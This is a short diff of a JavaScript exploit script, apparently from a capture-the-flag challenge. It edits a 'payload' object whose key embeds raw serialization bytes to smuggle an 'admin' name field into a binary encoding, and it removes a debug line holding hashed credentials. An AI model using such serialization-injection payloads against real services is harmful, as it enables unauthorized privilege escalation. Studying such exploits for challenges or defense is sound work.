@@ -80,9 +80,8 @@ var encodeNP = function(s){
     return result;
 }
 
-// console.log(encodeNP(pint("\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5".length)));
 const payload = {
-    'name': 'nytr0gen1337',
+    'name': 'nytr0gen31337',
     'age': 20,
     'desc': 13,
     "zzzz\u00bd\u00bd\u00bd\u00bd\u00bd\u0001\u0005\u0000\u0000\u0000": "\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin" +
